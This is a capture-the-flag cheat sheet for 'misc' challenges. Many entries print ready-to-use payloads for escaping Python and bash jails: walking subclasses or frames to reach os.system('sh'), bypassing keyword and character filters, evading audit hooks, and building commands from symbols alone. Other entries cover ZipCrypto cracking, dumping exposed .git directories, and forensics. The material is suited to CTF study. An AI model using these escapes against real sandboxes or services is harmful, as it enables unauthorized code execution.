---
title: misc
type: note
permalink: ctf-vault/misc
---

# Misc — CTF Pattern Vault

> Mined from real writeups, deduped, sorted by frequency (high→low, quick wins first). 18 patterns. Recognition-first: observe **signal** → run **tool/command**.

---

## pyjail: subclasses traversal to RCE
- category: misc
- signal: Python eval/exec sandbox, __builtins__ wiped/None, but object expressions allowed; no direct import
- technique: Walk object graph to object, enumerate __subclasses__(), find one whose __init__.__globals__ leaks os/system, call it
- tool/command: ().__class__.__base__.__subclasses__()  # find idx of os._wrap_close or warnings.catch_warnings, then:
().__class__.__base__.__subclasses__()[N].__init__.__globals__['system']('sh')  # or ['__builtins__']['__import__']('os').system('sh')
- gotchas: Subclass index N is version-dependent — NEVER hardcode; enumerate and grep for 'os._wrap_close'/'catch_warnings'. Use {} or '' as base if [] filtered.
- frequency: high
- depth: quick
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/, https://jia.je/ctf-writeups/misc/pyjail.html, https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/how-to-solve-a-pyjail.md

## pyjail: builtins via exception/generator/lambda frames
- category: misc
- signal: __builtins__ name blocked but you can raise/catch, build a lambda, or a genexpr
- technique: Frame/function objects expose f_builtins/f_globals/__globals__; recover __import__ from a leaked frame
- tool/command: try:
 1/0
except Exception as e: e.__traceback__.tb_frame.f_globals['__builtins__']['__import__']('os').system('sh')
# generator: (_ for _ in()).gi_frame.f_builtins['__import__']('os').system('sh')
# lambda: (lambda:0).__globals__['__builtins__']
- gotchas: f_builtins may be a dict OR a module — try both ['__import__'] and .__import__. Works when subclasses route is filtered.
- frequency: high
- depth: quick
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/

## pyjail: recover builtins from a reachable module
- category: misc
- signal: __builtins__ emptied in exec scope but a real module (re, os) is in globals()
- technique: Every module carries its own __builtins__; pivot through it to __import__/open
- tool/command: print(re.__builtins__['open']('/flag.txt','rb').read())
# generic: globals()['re'].__builtins__['__import__']('os').system('sh')
- gotchas: Only works if a module is reachable in globals(). If a word filter blocks 're', overwrite the filter list first when globals() is exposed.
- frequency: high
- depth: quick
- sources: https://github.com/yonlif/0x41414141-CTF-writeups/blob/main/pyjail.md, https://jia.je/ctf-writeups/misc/pyjail.html

## pyjail: bypass char/keyword/dunder/quote blacklist
- category: misc
- signal: Filter rejects '_','__','import','os','system', dots, or quotes before eval
- technique: Defeat substring/char filters: NFKC fullwidth-underscore, getattr+concat, chr()/byte build, no-quote string construction
- tool/command: # fullwidth underscore where __ banned (NFKC normalizes to _):
()._＿class＿_
getattr(x,'sy'+'stem')   |   __builtins__.__dict__['__imp'+'ort__']('os')
# no-quote 'os': string from chr: chr(111)+chr(115)
- gotchas: Python NFKC-normalizes identifiers so fullwidth _ parses as _ but dodges a naive '__' check. Source char blacklists beaten by chr()/concat; post-compile blacklists are NOT.
- frequency: high
- depth: quick
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/, https://jia.je/ctf-writeups/misc/pyjail.html

## encoding chain: identify + peel layers (CyberChef Magic)
- category: misc
- signal: Blob that decodes to more encoded text; alternating base64/base32/base85/hex/rot, morse, binary
- technique: Stack From-Base/Morse/ROT ops; lean on Magic (Intensive) to auto-ID each unknown layer
- tool/command: # CyberChef 'Magic' intensive mode; or CLI peel:
echo DATA | base64 -d | base32 -d
tr 'A-Za-z' 'N-ZA-Mn-za-m'   # rot13
- gotchas: Base32 = many '=' + only A-Z2-7; Base58/62 lack +/=. ROT47 covers all printable ASCII. gzip/zlib magic (1f8b/789c) needs decompress not decode. Verify each layer matches next alphabet — Magic misorders.
- frequency: high
- depth: quick
- sources: https://gchq.github.io/CyberChef/, https://github.com/mattnotmax/cyberchef-recipes, https://picoctfsolutions.com/posts/ctf-encodings

## zip: ZipCrypto known-plaintext (bkcrack)
- category: misc
- signal: Legacy ZipCrypto (NOT AES) zip; zipinfo/unzip -v shows 'ZipCrypto'; >=12 contiguous known plaintext bytes obtainable
- technique: Biham-Kocher known-plaintext recovers the 3 internal keys, then decrypt whole archive — no password
- tool/command: zipinfo -v enc.zip   # confirm ZipCrypto
bkcrack -C enc.zip -c secret.png -p known_header.bin   # recover keys, then:
bkcrack -C enc.zip -k K0 K1 K2 -D plain.zip
- gotchas: AES-256 zips are immune. Known plaintext must align to the deflate stream if compressed — use file magic (PK, \x89PNG, %PDF) and -o offset. Stored/uncompressed is easiest.
- frequency: high
- depth: quick
- sources: https://github.com/kimci86/bkcrack, https://wiki.anter.dev/misc/plaintext-attack-zipcrypto/, https://shreethaar.github.io/ctf-writeups/writeups/2024/ironctf/uncrackable-zip/

## git: recover deleted/dangling commit content
- category: misc
- signal: .git directory or repo where flag was committed then deleted/emptied in HEAD
- technique: Enumerate all refs + reflog + dangling objects; checkout/cat-file the old blob
- tool/command: git log --all --oneline; git reflog
git fsck --lost-found            # dangling commits/blobs
git cat-file -p <blob_sha>
# remote: gitdumper http://t/.git/ out && GitTools/Extractor extractor.sh out dst
- gotchas: `git log` alone misses dangling commits — use --all, reflog, fsck. Packed objects in .git/objects/pack/*.pack (git unpack-objects). Bare repo: files appear only after checkout -f. Stash/amended content lives in lost-found.
- frequency: high
- depth: quick
- sources: https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-git-refs/, https://github.com/martymonero/ctf/blob/master/2018/rctf/misc/git/README.md, https://naslabsec.it/writeups/my_poor_git/

## audio: spectrogram / DTMF / SSTV / morse
- category: misc
- signal: WAV/MP3 with odd sound: buzzing band (spectrogram text), keypad tones (DTMF), warble (SSTV), beeps (morse)
- technique: View spectrogram first; else demod DTMF/morse/SSTV with multimon-ng/qsstv
- tool/command: sox in.wav -n spectrogram -o out.png      # or Sonic Visualiser
multimon-ng -t wav -a DTMF -a MORSE_CW in.wav
qsstv -c in.wav                            # SSTV
stegolsb wavsteg -i in.wav -o out.bin -b 100  # LSB
- gotchas: Spectrogram FIRST — most common trick. multimon often needs raw 22050: sox in.wav -t raw -r 22050 -e signed-integer -b 16 -c 1 - | multimon-ng -t raw -a DTMF -. DTMF gives digits (may be ASCII-decimal). LSB only on PCM wav, not mp3.
- frequency: high
- depth: quick
- sources: https://ctf.support/misc/signals/, https://trailofbits.github.io/ctf/forensics/, https://www.aperikube.fr/docs/aperictf_2019/pick_up_the_phone_2/

## pyjail: file read without exec via help/print
- category: misc
- signal: open() reachable but exec/system blocked, or only output channel is help/print
- technique: Unpack file lines as args to a builtin that echoes them
- tool/command: print(*open('/flag.txt'))
# or
help(*open('/flag.txt'))
- gotchas: help() output may hit a pager/stderr. *unpack reads lines as args. Best when system() banned but open() survives.
- frequency: med
- depth: quick
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/, https://github.com/jailctf/pyjail-collection

## pyjail: f-string / str.format globals leak
- category: misc
- signal: Challenge prints a value through str.format or f-string with attacker-controlled format field
- technique: Format fields allow attribute/index access (no calls) — walk to __globals__ to leak the flag
- tool/command: '{0.__class__.__init__.__globals__[FLAG]}'.format(obj)
# template: {user.__class__.__init__.__globals__[FLAG]}
- gotchas: No calls in format fields, so this leaks DATA only; chain with a later eval for RCE. Index into __globals__ with bare key (no quotes inside [ ]).
- frequency: med
- depth: quick
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/

## bash jail: $IFS for space + wildcard filenames
- category: misc
- signal: Spaces blocked, or filename chars must not be typed directly
- technique: Use ${IFS} as separator; reference files via ? / * glob; brace expansion as space alt
- tool/command: cat${IFS}/flag*
/???/??t fl?g.txt        # /bin/cat flag.txt
{cat,/flag}              # brace as space
- gotchas: ${IFS} default = space+tab+newline. ? matches exactly one char (count length); globs only expand to EXISTING paths. Leading ./ needed to exec a matched script. Some jails strip * but allow ?.
- frequency: med
- depth: quick
- sources: https://github.com/andrewaeva/RingZer0-CTF-Writeups/blob/master/Jail%20Escaping/bash%20jail%201.md, https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/

## esolang: recognize by glyphs, run interpreter
- category: misc
- signal: +-<>[]., only = brainfuck; spaces/tabs/newlines only = whitespace; Ook./Malbolge/Piet variants
- technique: Match char alphabet to language, run matching interpreter
- tool/command: # brainfuck: bf prog.bf (or online)
# whitespace: wspace prog ; reveal with cat -A
# malbolge: malbolge interpreter ; piet: npiet img.png
- gotchas: Whitespace is invisible — cat -A/hexdump FIRST. Malbolge looks like base85 but isn't — don't base-decode. Brainfuck/output may be wrapped in another encoding layer or Caesar on top.
- frequency: med
- depth: quick
- sources: https://github.com/TonyCrane/note/blob/master/docs/ctf/misc/esolang.md, https://0xss0rz.gitbook.io/0xss0rz/ctf/cryptography-1/esoteric-programming, https://www.dcode.fr/whitespace-language

## docker: flag in deleted/earlier image layer
- category: misc
- signal: docker image tar (docker save) or registry pull; secret rm'd in a later layer
- technique: Extract each layer.tar in manifest order; grep prior layer before the whiteout
- tool/command: docker save img -o img.tar; mkdir x; tar -xf img.tar -C x
for l in x/*/layer.tar; do tar -xf $l -C scratch/; done
grep -rao 'flag{' scratch/   # or: dive img
- gotchas: dive shows the secret but can't always export — fall back to manual tar. .wh.* whiteout files mark WHICH layer deleted it; grab from prior layer. Also check docker history --no-trunc for ENV/ARG secrets.
- frequency: med
- depth: quick
- sources: https://ctftime.org/writeup/31439, https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics

## QR/barcode: decode, repair, reassemble
- category: misc
- signal: QR/barcode image — damaged, inverted, fragmented, missing finder/alignment, or color-channel hidden
- technique: zbarimg first; else rebuild in QRazyBox and Reed-Solomon decode
- tool/command: zbarimg code.png            # try first
# fail: QRazyBox -> Painter redraw finders/timing -> Tools>Extract QR Info
#       -> brute format bits -> Reed-Solomon Decoder
- gotchas: QR ECC fixes up to ~30% loss (level H) — don't need every module. Fix 3 finder + timing patterns first. Version=(size-17)/4. For scrambled regions, automate tile permutations through zbarimg.
- frequency: med
- depth: quick
- sources: https://merri.cx/qrazybox/help/examples/basic-example.html, https://ctf.support/misc/qr-barcode/, https://medium.com/@nteezy/how-to-decode-a-partially-visible-or-damaged-qr-code-a-ctf-writeup-for-stack-the-flags-2020-4ef0eb6a018f

## unicode: zero-width / homoglyph hidden data
- category: misc
- signal: Plaintext looks normal but odd length, copy-paste artifacts, or fails string comparison
- technique: Inspect raw bytes for zero-width chars / homoglyphs; decode bit pattern
- tool/command: xxd file.txt | grep -E 'e2 80 8[b-f]|ef bb bf'   # ZWSP/ZWNJ/ZWJ/BOM
python3 -c "print([hex(ord(c)) for c in open('f.txt').read()])"
# decode via 330k unicode-steg tool / ZeroWidthStego
- gotchas: Culprits: U+200B/C/D, U+202C, U+FEFF encode bits between visible chars. Homoglyph: Cyrillic а (U+0430) vs Latin a = 1 bit. NEVER unicode-normalize first — it destroys the payload. grep 'e2 80' catches most.
- frequency: med
- depth: quick
- sources: https://captainnoob.medium.com/zero-width-space-steganography-zwsp-ctf-92e1c414c378, https://330k.github.io/misc_tools/unicode_steganography.html

## pyjail: audit-hook / no-os sidechannel exec
- category: misc
- signal: sys.addaudithook blocks os.system/subprocess/open/import, or builtins gutted but modules pre-imported
- technique: Pick a spawn/read primitive whose audit event is NOT hooked
- tool/command: import multiprocessing.util
multiprocessing.util.spawnv_passfds(b'/bin/sh',['/bin/sh','-c','cat /flag'],[])
# or: import readline; readline.read_history_file('/flag'); readline.get_history_item(1)
- gotchas: Audit fires on exec/import/open/os.system — choose a primitive without a hooked event. Enumerate sys.modules for pre-loaded helpers (ctypes, signal, _posixsubprocess).
- frequency: med
- depth: deep
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/, https://jia.je/ctf-writeups/misc/pyjail.html

## pyjail: no-parens call (decorators / comprehension)
- category: misc
- signal: Parentheses '(' banned, or must call without (); spaces may also be banned
- technique: Stack decorators so inner produces a string and outer exec's it; or no-space comprehension call primitive
- tool/command: @exec
@input
def x():pass   # input() then exec() the result
# no-space comp primitive: [[]for[a]in[[b]]]
- gotchas: Decorator runs callable on the function object — chain so inner yields a string, outer exec's. Comprehension primitive is fiddly (jailctf 2025 'impossible').
- frequency: med
- depth: deep
- sources: https://shirajuki.js.org/blog/pyjail-cheatsheet/, https://github.com/jailctf/pyjail-collection, https://github.com/jiegec/ctf-writeups/blob/master/docs/misc/pyjail/jailctf-2025-impossible.md

## bash jail: no-alphanumeric command construction
- category: misc
- signal: Restricted shell allows only chars like $ ( ) # ! { } < \ ' , — no letters/digits
- technique: Build digits from $#/${##}+arithmetic, chars via octal $'\NNN', spaces via brace, exec via $0/${!#}
- tool/command: # numbers: $#=0, ${##}=1, $((${##}<<${##}))=2
# chars: $'\154\163' -> 'ls' ; space via {bash,-c,cmd}
${!#}<<<{bash,-c,$'\143\141\164\40\57\146\154\141\147'}  # cat /flag
- gotchas: stdin often closed before exec — use here-string <<< not pipes. ${!#}=indirect last param=bash path. Compute the radix '2' itself from $((${##}<<${##})).
- frequency: med
- depth: deep
- sources: https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60, https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash